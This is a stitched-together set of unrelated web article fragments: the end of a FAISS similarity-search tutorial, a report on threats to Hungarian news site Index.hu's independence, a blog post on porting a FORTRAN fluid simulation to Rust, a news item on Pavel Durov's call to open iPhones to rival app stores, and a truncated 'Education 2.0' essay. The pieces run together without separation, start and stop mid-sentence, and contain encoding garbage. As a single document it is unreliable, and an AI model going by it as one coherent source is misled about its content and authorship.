neighbors at the beginning of the array row, with a distance of 0 with itself and increasing in value as we move towards the end.&nbsp;</p><p>Another thing to remember is that in this case the index of the arrays is set automatically by FAISS in increasing order like the "auto_increment" column in SQL databases. It is advisable to use either a mapper with FAISS to real indexes or use a FAISS provided index setting which will come up further along.</p><h3>Cosine Similarity Measurement</h3><p>Although calculating Euclidean distance for vector similarity search is quite common, in many cases <strong>cosine similarity</strong> is preferred. In FAISS we don't have a cosine similarity method but we do have indexes that calculate the inner or dot product between vectors. For example, the <strong>IndexFlatIP</strong> <strong>index</strong>. We can then take advantage of the fact that cosine similarity is simply the dot product between normalized vectors.&nbsp;</p><p>The code snippet below shows how this can be implemented. Partition-based Index</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8aa4dd31940e941cddbd_image%204.png" alt=""></p></figure><p>Another class of indexes in FAISS are partition-based indexes that speed up searches by partitioning the index into clusters and limiting the search to only a few clusters. This method however is not exact as there is no guarantee that the nearest neighbors will be in the clusters searched in.&nbsp;&nbsp;</p><p><br>An example of an index that uses partitioning techniques to make the search space a lot less and far more efficient is <strong>IndexIVFFlat index</strong>.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8aaf04e10128d6d54b3c_image%205.png" alt=""></p></figure><p>‍</p><p>The search operation can be carried out in the same way as earlier indexes. However, in the IVFFlat index we define the “nprobe” hyperparameter to limit the search to only the defined number of clusters nearest to the query vector. This is also an example of how different indexes can be compounded to form a single index.</p><h3>Principal Component Analysis (PCA)</h3><p>We’ve looked at the use cases for some of the basic algorithms in FAISS. This section looks at a method called PCA. It is an algorithm that is popular in unsupervised machine learning that is used to reduce the vector dimensions using <strong>Principal Components</strong> of the vector space.</p><p>In FAISS, PCA is generally followed by indexes like IndexFlatL2 or IndexIVFFlat and they are linked with the help of the <strong>IndexPreTransform</strong> function.&nbsp;One requirement of this method is that the dimension of a vector needs to be a multiple of 4.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8ab9ec95620e8410fb11_image%206.png" alt=""></p></figure><h3>Dimension Remapping</h3><p>PCA allows us to reduce the dimensions but what if we want to increase the dimensionality of the vectors? We may encounter this scenario if we want to use an IndexIVFFlat index for instance. In this case, the dimensionality should ideally be a multiple of 4. FAISS allows us to do this through the <strong>RemapDimensionTransform </strong>method.As an example, let us suppose we have a vector of size 150 that we need to use with an IndexIVFFlat index. The way we transform this to a size that is a multiple of 4 (152) is given below.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8ac81fd412abe2e2dab8_image%207.png" alt=""></p></figure><p>‍</p><div><p>What next?This brings us to the end of Part 1 of this discussion on using the FAISS library from Facebook. Here we looked at the speedup it provides when compared to the similar methods used in Scikit-learn, and how FAISS optimizes this through various indexes. In Part 2 we will go beyond the basic indexing methods and look at more advanced versions. We will also look at the GPU support in FAISS, and how to make the calculations even faster by leveraging them.</p><p>‍</p></div></div></div>]]>

<ul><li>Stay updated on the latest news from Hungary by signing up for the free InsightHungary newsletter:</li></ul><p>Vice President of the European Commission for Values and Transparency Věra Jourová sent a <a href="https://index.hu/kultur/media/2020/07/07/aggodik_az_index_fuggetlensegeert_az_europai_bizottsag_alelnoke/">letter</a> on July 7 to Index.hu, Hungary’s largest online news portal, expressing her solidarity with its staff which she said “has been working under very difficult conditions”.<br></p><p>Jourová wrote that while media revenues have been heavily hit by the coronavirus pandemic, “economic pressure should not turn into political pressure...I have been following the situation of Index with concern. What you are doing, the values you are fighting for, media freedom and pluralism, are essential for democracy.”</p><p>The letter came amid what Index considered a fight for its existence. In late June, an urgent <a href="https://index.hu/english/2020/06/21/independence_of_index_in_danger_hungary_press_freedom_media/">public statement</a> signed by around 100 editors and journalists raised the alarm that the site's independence had come under attack, and that the outlet was in "grave danger".&nbsp;</p><p>To many observers of Hungary's media environment, the news came as little surprise. It was widely considered only a matter of time before the outlet faced attacks on its editorial independence, an expectation engendered by years of other Hungarian websites, newspapers, television networks and radio stations being shuttered or suddenly transformed under political and financial pressure.</p><p>This year, media watchdog Reporters Without Borders, which has described the level of media control in Hungary as "unprecedented" in the European Union, <a href="https://rsf.org/en/hungary">ranked </a>the country 89th in the world for media freedom, down 33 places from when the organization began its rankings in 2013. Additionally, the U.S.-based non governmental organization <a href="https://freedomhouse.org/country/hungary/freedom-world/2020">Freedom House</a> gave Hungary a score of two out of four for media freedom and plurality this year.</p><p>Despite this media environment and a perpetual struggle to preserve its independence, Index has, somewhat paradoxically, managed to remain the <a href="https://reutersinstitute.politics.ox.ac.uk/sites/default/files/2020-06/DNR_2020_FINAL.pdf">most-read and one of the most trusted news sources in Hungary</a>&nbsp;for the past 20 years. It has maintained its critical reporting even as government-tied businesspeople were embedded in its ownership structure, and has walked a tightrope between its journalistic principles and a deep uncertainty over when, and how, they might be curtailed.</p><p>This constant vulnerability, and the ways Index’s newsroom has successfully struggled to retain its independence while so many other Hungarian outlets could not, are illustrative of the broader mechanisms that have undermined media plurality and freedom in Hungary for the past decade.</p><h2>“Index Is In Danger”</h2><p>Two years ago, staff at the outlet established an <a href="https://szabadindex.eu/">online independence barometer</a>, a means of directly addressing readers on the status of Index's editorial independence. The barometer was set up after a government-tied figure purchased a stake in the company that controls Index’s revenue stream, and was emblematic of the perceived inevitability of an attack on the site. At the time, a <a href="https://index.hu/english/2018/09/18/index_independence_press_freedom/">letter to readers</a> said that staff felt they were “stuck on the frontline of a world war. Sometimes it’s the Red Army, sometimes it’s the Wehrmacht that marches over us.”<br></p><p>For the two years since its inception, the barometer read “Independent”. But on June 21, for the first time, staff moved the dial to "In Danger".</p><figure><a rel="nofollow" href="https://4cdn.hu/kraken/image/upload/s--axVjxGbd--/7T9PtAkyhooMBj7ps.jpeg"></a><figcaption><svg xmlns="http://www.w3.org/2000/svg" version="1.1" preserveAspectRatio="xMidYMid">

</svg><span>Index's "independence barometer"</span><span>Fotó: index.hu</span></figcaption></figure><p>The change came after a series of board meetings of Index’s parent foundation, where a recommendation was made by an outside advisor to break up the site and outsource its content creation to external, newly-formed companies.<br></p><p>The proposal, ostensibly a response to economic pressure caused by the coronavirus pandemic, alarmed several members of the board of directors, including editor-in-chief Szabolcs Dull and CEO András Pusztay. In a <a href="https://index.hu/english/2020/06/21/independence_of_index_in_danger_hungary_press_freedom_media/">statement</a>, Dull wrote that Index was “under such external pressure that could spell out the end of our editorial staff as we know it. We are concerned that with the proposed organisational overhaul, we will lose those values that made Index.hu the biggest and most-read news site in Hungary.”<br></p><p>When news of the proposal leaked in the media, Dull was suspended from the board of directors. A few days later, Pusztay resigned as CEO, saying he could not in good conscience carry out the orders which had been placed on him. Since then, the newly-appointed CEO <a href="https://index.hu/kultur/media/2020/06/30/lemondott_az_index_vezerigazgatoja_zodi_zsolt/">resigned</a> after less than a week on the job, and another <a href="https://index.hu/english/2020/07/07/index_indamedia_hungary_press_freedom_editor_in_chief_advisor/">external advisor</a> has <a href="https://444.hu/2020/07/07/az-indamedia-tanacsadoja-az-index-foszerkesztojenek-levaltasat-surgeti">recommended Dull’s removal</a> as editor-in-chief.</p><p>These disruptive events and proposals by government-tied advisors alarmed Dull, Pusztay and many staff members on their own merits, but the circumstances’ similarities to earlier takeovers of critical media outlets likely added fuel to their suspicions. The events at Index, and some of the actors involved, fit a pattern going back years that illustrates a cohesive strategy for building a media environment that can be managed from the highest levels of political power.</p><h2>The Usual Suspects</h2><p>In March, an influential figure in pro-government media enterprises purchased a 50 percent stake in Indamedia, the company which controls all of Index's revenue streams and has exclusive rights to manage its advertising. The arrival of Miklós Vaszily in Index’s innermost circumference caused new concerns that government-tied figures were closing in on the outlet, evoking alarming memories of an earlier event involving Vaszily that sent shockwaves through the Hungarian media market.</p><p>In 2014, Vaszily oversaw the <a href="https://444.hu/2014/06/05/deutsche-telekom-hungarian-government-collude-to-silence-independent-media">dramatic takeover</a> of Hungary’s then-largest online news outlet Origo, where he served as CEO. Origo’s reporting on cases of corruption within the government, especially concerning two high-level ministers from the governing Fidesz party, reportedly angered party officials and led to political pressure being placed on the outlet’s parent company.&nbsp;</p><p>Vaszily is widely thought to have acted on the government’s behalf to facilitate changes at Origo that resulted in the <a href="https://444.hu/2014/06/02/varatlanul-kirugtak-az-origo-foszerkesztojet/">dismissal of the site’s editor-in-chief</a> and the <a href="https://444.hu/2014/06/04/petho-andras-a-lazar-utazasairol-szolo-cikk-szerzoje-felmond-az-origonal/">resignation</a> of more than 30 journalists over what they considered a pro-government shift in editorial direction. Once a producer of quality investigative journalism and reportage, Origo is now considered by many to be a government mouthpiece.</p><figure><a rel="nofollow" href="https://4cdn.hu/kraken/image/upload/s--RGLOgiES--/6rMVTtlrB1zC1F5pJs.jpeg"></a><figcaption><svg xmlns="http://www.w3.org/2000/svg" version="1.1" preserveAspectRatio="xMidYMid">

</svg><span>Miklós Vaszily (center), the joint owner of Indamedia.</span><span>Fotó: Koszticsák Szilárd</span></figcaption></figure><p>Following the takeover of Origo, Vaszily quickly rose through the ranks of government-tied media. He was appointed CEO of Hungary's public broadcasting organization MTVA (itself deeply loyal to the Fidesz-led government), and later became the CEO of Echo TV and the chairman of TV2, both owned by Lőrinc Mészáros, an oligarch and personal childhood friend of Prime Minister Viktor Orbán. According to <a href="https://tldr.444.hu/2020/07/02/csendben-fojtana-meg-az-indexet-a-kormany-de-a-szerkesztoseg-nem-hagyja-magat">reporting by 444’s Pál Dániel Rényi</a>, Vaszily is known to have connections with the highest levels of government, and meets personally with Mr. Orbán to discuss important issues.<br></p><p>His important role in the government-tied media landscape and involvement in the Origo affair made Vaszily’s entrance in the ownership structure of Index seem to portend a future for the outlet which could echo Origo’s fate.&nbsp;</p><p>Origo’s 180-degree turn serves as a template for how government loyalists have repurposed critical media in the service of political interests. Often, rather than hostile legislation or direct intervention being used to transform an outlet, changes in ownership and financial pressure have been applied to indirectly shift outlets’ editorial direction, insulating the government from direct involvement. Financial "reforms" are thus used to justify takeovers under the banner of simple commercial efficiency.&nbsp;</p><p>These same arguments are now being used to account for changes at Index: Vaszily has <a href="https://tldr.444.hu/2020/07/02/csendben-fojtana-meg-az-indexet-a-kormany-de-a-szerkesztoseg-nem-hagyja-magat">denied</a> he intends to muzzle the outlet, but insists economic problems must be addressed – despite the site’s position as the leader on the Hungarian media market.&nbsp;</p><p>Undermining media independence using financial “reforms” is a model that has been frequently used since 2010, although more aggressive methods including outright closure have also been employed. In 2016, Hungary's most-read daily newspaper Népszabadság was <a href="https://www.nytimes.com/2016/10/12/world/europe/hungary-newspaper-nepszabadsag.html">suddenly shut down</a> following the acquisition of the paper’s publisher by an Austrian businessman with ties to Fidesz. Staff arrived one morning to find they had been locked out of the building, and could access neither their company email accounts nor the paper’s website. The closure, which staff described as a “coup”, made international headlines and resulted in a wave of <a href="https://www.theguardian.com/world/2016/oct/09/protests-in-hungary-at-closure-of-main-leftwing-opposition-newspaper">street protests</a> for media freedom, but the paper’s publisher insisted the decision was purely economic, and that the paper had been struggling financially.</p><figure><a rel="nofollow" href="https://4cdn.hu/kraken/image/upload/s--MT582P6T--/6vATDH0v0K1lghSTs.jpeg"></a><figcaption><svg xmlns="http://www.w3.org/2000/svg" version="1.1" preserveAspectRatio="xMidYMid">

</svg><span>A protester holds a copy of Népszabadság at a protest against the paper's closure.</span><span>Fotó: Zoltan Tuba.www.tubazoltan.com</span></figcaption></figure><p>Another means for seizing control of the media has been the generous use of <a href="https://www.tandfonline.com/doi/full/10.1080/21599165.2019.1662398?fbclid=IwAR0dDqMkZUlLipK1vS_QqWTEN1qm99Iupb4qde-vj1IW4BVx8kW9vv1LLDE&amp;">government advertising</a> in friendly publications and the withholding of ads in critical ones, heavily distorting the media market and putting financial pressure on independent outlets. Nearly 90 percent of ad revenues in the Fidesz-tied newspaper Magyar Idők came from <a href="https://www.tandfonline.com/doi/full/10.1080/21599165.2019.1662398#F0002">ads paid for by the government</a> in 2017, compared with 3 percent in the conservative Magyar Nemzet (which was government-critical at the time but has since been recaptured). According to editor-in-chief Dull, Index receives practically none of its ad revenue from the government.<br></p><p>Such methods for media control, which have now become commonplace, first began with Fidesz’s entrance to power in 2010, and represented a dramatic interruption of some 20 years of relative balance and development in Hungary’s media market following the collapse of socialism in 1990.</p><h2>Paradise Lost</h2><p>At the time of Index’s founding in the late 1990s, Hungary was entering a period of hopeful optimism following a decade of uncertainty and economic decay that came after what Hungarians call “the system change”, the country’s democratic transition after 1989. The internet was just taking off in the country, and for many, Index was symbolic …</p></article></div></div>

There were secondary goals such as improving the testing infrastructure, setting up CI/CD, estimating progress and allowing the computation to be paused and resumed.</p><p>Forewarning: I have essentially zero domain knowledge in this project (and fluid dynamics simulation isn’t exactly the kind of topic you can catch up to research level on over a weekend) so I approached this project from a purely software engineering perspective. As for my Rust experience, I’ve been using it for personal projects since ~2016 and I worked as a Rust software engineer at a startup in Berlin for a year after leaving high school.</p><h2 id="dont-rewrite">Don’t Rewrite</h2><p><a href="https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/">Don’t.</a></p><p><a href="https://understandlegacycode.com/blog/avoid-rewriting-a-legacy-system-from-scratch-by-strangling-it/">Rewrite.</a></p><p><a href="https://medium.com/better-programming/how-i-failed-to-deal-with-legacy-code-8e123cff5bce">Legacy.</a></p><p><a href="https://daedtech.com/the-myth-of-the-software-rewrite/">Code.</a></p><p>Not too hard a concept to grasp, is it? Not much ambiguity and a clear line of reasoning to follow as to why legacy software should not be rewritten. Well I read the articles written by people far more experienced and knowledgable than myself and thought:</p><p><img src="https://mckeogh.tech/post/shallow-water/0e1.png" alt="https://knowyourmeme.com/memes/that-sign-cant-stop-me-because-i-cant-read"></p><h2 id="why-my-situation-is-different">Why <em>My</em> Situation is Different</h2><p>All jokes aside, there are situations where a re-implementation is a reasonable option and I did have several factors to back me up.</p><p>FORTRAN is undoubtably <em>very</em> fast and highly suited to HPC problems with decades-optimised compilers and debugging tooling but it does lack certain features, namely memory safety, thread safety, data race guarantees and ergonomic GPU/CLI/TUI libraries.</p><p>Having written parallel software in both C and Rust, the memory safety guarantees and easy parallelisation with Rayon offered by Rust contrasts quite sharply with my poor experience using OpenMP. Replacing <code>.iter()</code> with <code>.par_iter()</code> and having the compiler automatically throw errors for any code that isn’t thread safe is amazing compared with adding OpenMP directive sentinels (designed to be hidden from a non OpenMP-compliant FORTRAN compiler) and manually determining thread and memory safety. Here seems a good a place as any to mention that <a href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">“~70% of the vulnerabilities Microsoft assigns a CVE each year continue to be memory safety issues”</a>.</p><p>It was believed initially that GPUs could be used to accelerate the computation, ~another place where Rust’s (while not mature) ecosystem also shines above those offered for FORTRAN~ EDIT: completely untrue, FORTRAN’s GPU acceleratin libraries are very mature and production ready. Additionally when it came to the additional requirements building a <code>ncurses</code> interface in FORTRAN isn’t exactly ergonomic compared with the libraries available in Rust. I spent some time reading through the original implementation and attempted some basic parallelisation with little success due to small errors being hard to diagnose across long executions without snapshot testing across multiple modules.</p><p>Not only was there several “pull” factors, but there was also the absence of the typical reasons you shouldn’t rewrite: I was working as a one-person team, the software was finalised and so never needed to be modified again, it was relatively small so could be rewritten in a matter of months (part time) and is not a live business component so uptime and upkeep of the original implementation are irrelevant.</p><p>Given all of this I decided it would be faster to rewrite in Rust, then be able parallelise it and add features quickly than it would be to plough through with the FORTRAN, and with a go-ahead from my supervisor I got to work.</p><h2 id="translating-fortran-to-rust">Translating FORTRAN to Rust</h2><p><em>Relatively</em> straightforward translation of existing codebases in compiled languages to Rust is a noted benefit due to the combination of software like <a href="https://c2rust.com/">C2Rust</a> to perform automatic translation of C source into Rust, <a href="https://github.com/rust-lang/rust-bindgen">bindgen</a> for automatically generating FFI bindings and of Cargo’s ability to compile code in other languages as part of a Rust project. While there are plenty examples of large projects successfully migrating to Rust this way, the issue I faced was that it would have required a two-step process, first translating from FORTRAN to C and then from C to Rust. I assumed the likelihood that the resulting code would be remotely parsable was very low and I couldn’t even get either of the most popular FORTRAN to C conversion tools to work.</p><p>Since the original implementation was only 6,000 lines total I decided to go with a manual translation. This involved starting at the base of the module tree with the Fast Fourier Transform routines and working upwards. I kept my process simple by inserting small pieces of FORTRAN to dump state at the beginning and end of routines which was then used for snapshot tests for the Rust implementation. This resulted in a thorough, robust testing suite which was invaluble during the optimization period. I really only made one bad design decision (please don’t read through the git history to confirm this 😅) during the translation phase which was thinking that nested <code>Vec</code>s would be easier than using <code>ndarray</code> from the start. This was a Bad Decision™️ and wasted so much time, not only in the abysmal execution speeds slowing down <code>cargo test</code>, but also in that it significantly increased development time. I would replace a statement such as</p><p>with</p><div><pre><code data-lang="rust"><span>// Awful, awful Rust
</span><span></span><span>for</span> i <span>in</span> <span>0</span>..x {
	<span>for</span> j <span>in</span> <span>0</span>..y {
		a[i][j] <span>=</span> a[i][j] <span>*</span> b[i][j]
	}
}
</code></pre></div><p>when the final <code>ndarray</code> version would look like</p><div><pre><code data-lang="rust"><span>// Ergonomic Rust
</span><span></span>a <span>*=</span> <span>&amp;</span>b;
</code></pre></div><p>Clearly the intermediary step could have been skipped and a more direct translation was possible. I wrote a regex to replace FORTRAN array indexing syntax (<code>array(x,y,z)</code>) to nested <code>Vec</code>s in Rust (<code>array[x][y][z]</code>), when <code>ndarray</code> syntax (<code>array[[x,y,z]]</code>) would have been a far simpler conversion. If this decision wasn’t bad enough, I also wasted time writing several functions to convert between a byte slice and the nested <code>Vec</code>s with the FORTRAN memory layout when <code>ndarray</code> has a built-in preset for FORTRAN shape and strides.</p><p>One issue that arose during testing was that due to the accumulation of small errors in floating point math, results would be slightly different between operating systems and hardware configurations which made the fantastic snapshot testing tool <code>insta</code> unsuitable. Instead <code>ndarray</code>’s <code>serde</code> and <code>approx</code> feature flags are used to read serialised arrays from disk to compare approximately during tests which has been working well.</p><h2 id="optimizing">Optimizing</h2><h3 id="parallelisation">Parallelisation</h3><p>Fundamentally the problem is not one that may be described as “embarrassingly parallel”, which was the assumption made going into the project (early discussions involved expectations of a 100x improvement on the university cluster). Ideally we would be want many large chunks of independent computation operating on a small amount of data, making it easy to distribute work across threads, GPUs and potentially different machines, but unfortunately I learned this problem is quite far from that ideal.</p><p>The outermost loop advances through time and is therefore strictly sequential, and in the primary function of the program (<code>src/nhswps/advance.rs:advance</code>) a large portion is iterated over twice, also strictly sequential. Some other lower-level functions perform operations on individual layers and so can be parallelised completely, but these are not generally very complex functions and so finish quickly before returning to sequential execution. <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s Law</a> comes into affect here, describing how even if everything that can be parallelised is, there are fundamental limits to the scaling we can ever achieve.</p><h3 id="memory-bandwidth-issues">Memory Bandwidth Issues</h3><p>Throughout the program there are several kinds of operations being performed on the 2- and 3-dimensional arrays. Transformations between physical and spectral is common, involving calling the Fourier transform functions and swapping axes. Other than those, many operations are simple additions, subtractions and multiplications between arrays, sometimes including constants. The result of this is that these simple operations are being performed on some very large amounts of data which I believe is resulting in a memory bandwidth bottleneck. This hypothesis explains why SIMD did not improve performance and performance is not significantly improved by parallelisation. It only takes several cycles to perform a floating point ADD or MUL instruction, so even at tens of gigabytes per second of memory bandwidth it will be insufficient to keep the CPU “fed”. Performing the operations with AVX-2 instructions does not improve performance because even though the same operation may now be performed on several floats simultaneously the limit is still how quickly they may be read from memory. It is slightly more complicated in the multithreaded context because there is an improvement in performance; perhaps due to multiple threads being able to increase the amount of data read from memory. The program is also very cache-unfriendly, reading large amounts of data in only to perform a simple, fast operation before reading in new data. At several gigabytes in size even individual layers aren’t even close to being able to reside in on-die cache. I am unsure of how I might collect proof of my hypothesis but I believe it explains a great deal of the behaviours I’ve witnessed throughout this project.</p><h3 id="gpu-unsuitability">GPU Unsuitability</h3><p>There was also some hope at the beginning of the project that GPUs could be used but there are two main reasons they are unsuitable.</p><p>Firstly, ~GPUs with large amounts of VRAM (128GB+) simply aren’t available~ EDIT: I was wrong, <em>commercial</em> gaming and workstation GPUs don’t get that large, but there are plenty of datacentre options, like the <a href="https://cloud.google.com/blog/products/compute/announcing-google-cloud-a2-vm-family-based-on-nvidia-a100-gpu">A100</a>. There is the <a href="https://www.amd.com/en/products/professional-graphics/radeon-pro-ssg">Radeon Pro SSG</a> which is a really interesting product but the memory bandwidth of …</p></article></section></div></div>

Not only that, but he also wants legislation to make this happen.</p><p>Speaking at the panel discussion with Russian Prime Minister Mikhail Mishustin and representatives of the IT industry in Innopolis, Telegram Manager and Vice President, Ilya Perekopsky said that Apple and Google are holding back the development of startups by charging a tax of 30 percent commission from app developers. Immediately after Perekopsky’s speech,&nbsp;Durov published an article in which he called for legislation mandating Apple to be legally obliged to allow users to install an alternative App Store on the iPhone. Durov says that Tim Cook, Apple CEO should be obligated to this at the legislative level.</p><p>Durov is taking the bull by its horn. Apple has been successful because of its closed technology. It not only does not allow any other App store to be installed on iPhones but it also takes action against any iPhone jailbreaks that happen. We all know that the <a href="https://androidrookies.com/unc0ver-jailbreak-tool-for-iphone-released-works-on-all-ios-versions-including-ios-13-5/">uc0ver team released a jailbreak</a> exploiting the previously unknown vulnerability in iOS just hours after Apple released iOS 13.5.

Many private iPhone App stores exist like Cydia, Xabsi, etc but they work only on jailbroken iPhones.</p><p>Much of Apple’s profit is from selling content on its App stores. In fact, Apple’s App Store platform grossed around $50 billion for App store in 2019, according to an analysis by CNBC. Apple takes 30 percent commission from App developers to make their apps available on Apple Store. Last year it paid $35 billion to developers from the App store revenue and kept $15 billion for itself.</p><p>Durov has reasons for being mad at Apple for not allowing other App stores. Durov says that Russian startups fail to make money by paying 30% to Apple. “Preventing two supranational corporations from collecting taxes from all of humanity is not an easy task. Corporations employ thousands of lobbyists, lawyers, and PR agents, and their budgets are unlimited. At the same time, app developers are scattered and scared, as the fate of their projects depends entirely on the favor of Apple and Google,” wrote Pavel Durov.</p><p>Durov also has a personal bias for wanting Apple to open up its iOS for alternative App stores. In 2016, Apple banned the Telegram team from launching its own game platform. This hurt Durov and Telegram’s ambitions, “We had to remove the telegram games catalog that we had already created and almost the entire platform interface, otherwise Apple threatened to remove Telegram from the AppStore.”</p><p>Recently, <a href="https://androidrookies.com/apple-threatens-to-remove-hey-com-email-app-unless-it-pays-outrageous-cuts-to-them/">email client, Hey.com</a> had a similar experience with Apple regarding publishing their App on the Apple App store.</p></div></div></div></article></div>]]>

      <div><p>What this essay does is that it introduces a brand new education system. This education system is way more effective than the current education system we have in place. And unlike the current education system, which has been the same for a long time. This one is constantly getting better with time and data, thanks to AI.<br></p><p>The best thing about it is that it's totally free of cost. So anyone in the world with access to a basic smartphone+Internet can access Education 2.0. Meaning, now everyone has the same educational opportunities as a Harvard/Stanford student.<br></p><p>You see, education is the most fundamental thing to human progress. And once you deploy something like Education 2.0 on a global scale, it will have huge positive implications on economic growth, life quality, and human progress. And to emphasise what I just said, the collective intelligence of humanity is the best predictor of future progress.Â&nbsp;<a href="https://ourworldindata.org/global-education#education-outcomes-predict-economic-growth" target="_blank">Here</a>Â&nbsp;is some empirical data to prove this statement. Nevertheless, you don't need empirical evidence; look around, education is what drives societal growth.<br></p><p>Looking at the current education system we have in place. It would be unfair to say that it hasn't done an excellent job in aiding human progress. Resolving the COVID-19 Pandemic, the Apollo Program, the iPhone, Tesla, SpaceX, the Internet, All of Science etc. are a prime example.<br></p><p>But it certainly hasn't been able to keep up with the growing human population, and the challenges raised by it. Looking at all the pressing issues, we face today like global poverty, climate change, and war. The incapability of civilisation to solve these problems stems from the fact that it's not educated enough as a whole. There is conclusive evidence to prove this â€”Â&nbsp;<a href="https://ourworldindata.org/global-education#social-returns-to-education" target="_blank">Education correlates with prosocial behaviour</a>. Prosocial behaviour is behaviour, which affects society as a whole.<br></p><p>So the best way to ensure that we progress into a brighter future is by rewiring the current education system. So it can keep up with the ever-growing population and the challenges we face, which will then eventually increase the collective wisdom and prosocial behaviour of humans at a much faster rate.<br></p><p>There are 3 main issues with the current education system, which dramatically lowers its potential.<br></p><ol>
<li>Its inability to reach a large population of the world.</li>
<li>The unequal distribution of resources.</li>
<li>The low efficacy of the current learning environments (i.e. lectures/books).</li>
</ol><p>And Education 2.0 fixes all of these issues.<br></p><p><strong><u>No access to education</u></strong></p><p>The biggest problem with the current education system is that it's unable to reach an unfairly enormous number of the global population. People say that education is a human right, but looking at the current situation â€” that doesn't seem so.</p><p>According to Humanium.org,Â&nbsp;<strong>72 million</strong>Â&nbsp;children of primary education age are not in school, andÂ&nbsp;<strong>759 million</strong>Â&nbsp;adults are illiterate.<strong>Â&nbsp;</strong>And we haven't even considered the inconsistency in educational outcomes yet.<br></p><p>Now I would like to explain the enormous implications this has on the economy. But first, I would like toÂ&nbsp;<a href="https://ourworldindata.org/grapher/correlation-between-mean-years-of-schooling-and-gdp-per-capita" target="_blank">establish a conclusive link between Education and GDP per capita</a>.<br></p><p>Now doing the math:<br></p><ul><li>
<strong>$18,381</strong>Â&nbsp;is the global average GDP per capita (a measure of economic output per person), and we haveÂ&nbsp;<strong>831 million peopleÂ&nbsp;</strong>with no access to education at all.</li></ul><ul><li>
<strong>831 million people * $18,381 ~ $15 Trillion</strong>Â&nbsp;worth of economic output wasted. And it has a growth rate of ~<strong>Â&nbsp;1.8% per year</strong>Â&nbsp;(Taking into account the growth rates of global GDP &amp; global population).</li></ul><ul><li>To put this number in perspective, this is more than the GDP of<strong>Â&nbsp;China</strong>,Â&nbsp;<strong>India,</strong>Â&nbsp;andÂ&nbsp;<strong>the UK</strong>Â&nbsp;separately, andÂ&nbsp;<strong>$5 TrillionÂ&nbsp;</strong>less than the USA.</li></ul><p>There is no doubt that the current model of the education system is responsible for this issue. An education system is basically a collection of what we call "learning environment.". And a learning environment is an environment where learning takes place (i.e. classroom).</p><p>You see, the major problem with the current system is the high relative cost of setting up that learning environment (i.e. a classroom with qualified teachers, furniture, and students, etc.). So when you scale the education system, the setup + maintenance costs increase with it. And some countries just don't have the resources to scale. This can be due to many factors like large population, not enough teachers, etc. All of these issues then boil down to one primary issue â€” lack of economic resources, aka no money.</p><p>Scaling requires huge costs, which then dramatically lowers the potential for impact. Due to which, a significant amount of people in the world don't have access to basic education.</p><p>To beat this issue, what we need to do is switch to a new model of the education system. One which can scale cheaply and effectively. The best way to do this is by moving to a more digitalised education system.</p><p>One way to go about doing this is by leveraging Software, AI, and low-cost smartphones. Software and AI can be leveraged to create digital learning environments, which are more effective than the current learning environments we have, and its efficacy improves with time &amp; data. These AI-taught lessons will be way better than attending a Stanford/Harvard lecture.<br>
</p><p>Once this works, the next thing to do is to ensure it supports low-cost smartphones, which will then allow for distribution at an enormous scale, while keeping the costs minimal. This will go a really long way in closing the educational gap. The best thing is that now anyone in the world will be able to have the same educational opportunities as an Ivy-League student.</p><p>In the long-term, you will see substantial positive implications on collective prosocial behaviour, economy, and quality of life. And redundancy in the current education system.<br>
</p><p><strong><u>Unequal distribution of educational resources</u></strong><br>
</p><p>First, we looked at inequality in terms of access to education. Now, we're going to look at inequality inside the people with access to education (in terms of the quality of educational resources). Turns out that this has huge negative implications on the overall learning outcome of the education system.</p><p>It is implausible to sustain the quality of educational resources (e.g. teachers, books, etc.) as you scale (make it available for a larger population) the education system. Due to which, a major side-effect of scaling is that it induces a widely unequal distribution of educational resources, which varies by economic demographic. Which then leads to variation in educational outcomes.</p><p>This is why the number of high-school graduates who attend prestigious colleges tends to be higher in private high-schools, relative to a public high-schools. The quality &amp; quantity of educational resources (quality of teachers, study material, support, etc.) available to students at the private school is more elevated. Which then leads to higher success.Â&nbsp;<br></p><p>Inequality in educational resources leads to a variation in educational outcomes, which then lowers the average output of the education system.</p><p>Now, coming around to solve this issue. We need to create a system where the quality of educational resources is the best on earth. And it's available to everyone, no matter their economic situation. And finally, as it scales, its overall effectiveness doesn't reduce.Â&nbsp;<br></p><p><strong><u>Low efficacy of current learning environments</u></strong></p><p>The final issue I would like to talk about is regarding the teaching methods used currently. Teaching methods are ways in which teachers teach the student. Â&nbsp;<br></p><p>The problem is that the current teaching methods, which are used around the world, are scientifically flawed. This then makes the process of learning inefficient and ineffective. And on a large scale, it reduces the learning output (the product of learning) of the education system.<br></p><p>You might think that sitting in a classroom, while a teacher speaks out everything, and you note it down is an excellent way to learn. But in fact, this method is flawed. The reason it's flawed because it bears no consideration whatsoever to how our brain operates during learning. Due to which, the conversion rate from auditory + visual perception to long-term memory is low. This dramatically lowers the learning potential of the student.<br></p><p>The modern K-12 education system was established back in the 19th century to prepare the population to participate in the Industrial Revolution. At the time, not a lot of thought was given to the science of how we learn; they just wanted a cheap way to deliver information to a large number of students. And surprisingly, this factory model of the education system hasn't changed since then.<br></p><p>What we need to do now is to build a digital learning environment, which makes learning way more effective &amp; efficient. Leading to a dramatic increase in learning output of the education system. And leverage AI, to make it so that it improves its efficacy with time &amp; data.<br></p><p>The way to do this is by understanding thoroughly, how the human brain operates while learning. And then using those scientific principles to design the learning environment.Â&nbsp;<br></p><p>Here is a fantastic essay by Andy Matuschak, which explains what I just said above better. You can read itÂ&nbsp;<a href="https://andymatuschak.org/books/" target="_blank">here</a>.</p><p>The starting point for this digital learning environment should be something, which is way more effective than any learning environment present today. Deploying this on a global scale will yield dramatically higher overall learning output than today. Making the current education systems redundant.Â&nbsp;</p><p>This would be the first step in accelerating the advent of Education 2.0. A world where high-quality education is free of cost to anyone and the quality of education is increasing over time. In the long term, this will mitigate all forms of inequality, and help humanity get onto a path of something bigger and brighter, thanks to its more immense collective wisdom.</p><p><b><u>Education 2.0Â&nbsp;</u></b></p><p><b><u></u></b>We have now talked about the major issues our education system faces and potential solutions to them. I would now like to introduce a brand new education system â€” Education 